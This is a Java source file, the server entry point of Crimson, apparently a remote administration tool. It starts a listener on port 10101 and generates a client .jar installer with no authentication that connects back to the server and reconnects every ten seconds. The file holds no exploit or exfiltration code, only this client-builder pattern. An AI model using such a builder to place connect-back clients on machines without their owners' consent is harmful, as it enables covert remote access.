/******************************************************************************
 *                                                                            *
 *                    Copyright 2016 Subterranean Security                    *
 *                                                                            *
 *  Licensed under the Apache License, Version 2.0 (the "License");           *
 *  you may not use this file except in compliance with the License.          *
 *  You may obtain a copy of the License at                                   *
 *                                                                            *
 *      http://www.apache.org/licenses/LICENSE-2.0                            *
 *                                                                            *
 *  Unless required by applicable law or agreed to in writing, software       *
 *  distributed under the License is distributed on an "AS IS" BASIS,         *
 *  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.  *
 *  See the License for the specific language governing permissions and       *
 *  limitations under the License.                                            *
 *                                                                            *
 *****************************************************************************/
package com.subterranean_security.crimson.server;

import java.io.File;
import java.io.IOException;

import org.slf4j.Logger;

import com.subterranean_security.crimson.core.Common;
import com.subterranean_security.crimson.core.Platform;
import com.subterranean_security.crimson.core.Common.Instance;
import com.subterranean_security.crimson.core.proto.ClientAuth.AuthType;
import com.subterranean_security.crimson.core.proto.Delta.EV_ServerInfoDelta;
import com.subterranean_security.crimson.core.proto.Generator.ClientConfig;
import com.subterranean_security.crimson.core.proto.Generator.NetworkTarget;
import com.subterranean_security.crimson.core.proto.Listener.ListenerConfig;
import com.subterranean_security.crimson.core.proto.MSG.Message;
import com.subterranean_security.crimson.core.proto.State.StateType;
import com.subterranean_security.crimson.core.storage.ServerDB;
import com.subterranean_security.crimson.core.util.CUtil;
import com.subterranean_security.crimson.core.util.FileLocking;
import com.subterranean_security.crimson.core.util.IDGen;
import com.subterranean_security.crimson.sv.Listener;

public final class Server {
	private static final Logger log = CUtil.Logging.getLogger(Server.class);

	private static boolean running = false;

	public static void main(String[] argv) {

		// Establish the custom fallback exception handler
		log.debug("Initializing exception handler");
		Thread.setDefaultUncaughtExceptionHandler(new ExceptionHandler());

		// Establish the custom shutdown hook
		log.debug("Initializing shutdown hook");
		Runtime.getRuntime().addShutdownHook(new ShutdownHook());

		// Check for file lock
		if (FileLocking.lockExists(Common.instance)) {
			log.error("Crimson detected that it's already running");
			return;
		} else {
			FileLocking.lock(Common.instance);
		}

		// Load native libraries
		Platform.Advanced.loadSigar();
		Platform.Advanced.loadLapis();

		// Clear /tmp/
		log.debug("Clearing local temporary directory");
		CUtil.Files.Temp.clearL();

		// initialize system database
		try {
			ServerStore.Databases.system = new ServerDB(new File(Common.var.getAbsolutePath() + "/system.db"));
			Common.cvid = ServerStore.Databases.system.getInteger("cvid");
		} catch (Exception e) {
			log.error("Could not initialize system database");

		}

		// start a localhost listener
		log.debug("Initializing local listener");
		ServerStore.Listeners.listeners.add(new Listener(ListenerConfig.newBuilder().setID(IDGen.getListenerID())
				.setPort(10101).setName("Default Local Listener").build()));

		start();

		generateDebugInstaller();
	}

	public static boolean isRunning() {
		return running;
	}

	public static void stop() {
		if (running) {
			log.info("Stopping server");
			running = false;
		}

	}

	public static void start() {
		if (!running) {
			log.info("Starting server");
			running = true;

		}
	}

	private static void generateDebugInstaller() {
		log.debug("Generating debug installer");

		ClientConfig cc = ClientConfig.newBuilder().setOutputType("Java (.jar)").setAuthType(AuthType.NO_AUTH)
				.addTarget(NetworkTarget.newBuilder().setServer("127.0.0.1").setPort(10101).build())
				.setPathWin("C:\\Users\\dev\\Documents\\Crimson").setPathBsd("/").setPathLin("/").setPathOsx("/")
				.setPathSol("/").setReconnectPeriod(10).build();
		try {
			Generator g = new Generator(cc);
			byte[] res = g.getResult();
			CUtil.Files.writeFile(res, new File("C:\\Users\\dev\\Desktop\\client.jar"));
			log.info("Installer size: " + res.length + " bytes");
		} catch (IOException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		} catch (Exception e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
	}

	public static void setState(StateType stateType) {
		switch (stateType) {
		case FUNCTIONING_OFF:
			stop();
			break;
		case FUNCTIONING_ON:
			start();
			break;
		case RESTART:
			break;
		case SHUTDOWN:
			break;
		case UNINSTALL:
			break;
		default:
			break;
		}
		// notify viewers
		ServerStore.Connections.sendToAll(Instance.VIEWER, Message.newBuilder()
				.setEvServerInfoDelta(EV_ServerInfoDelta.newBuilder().setServerStatus(running)).build());

	}

}
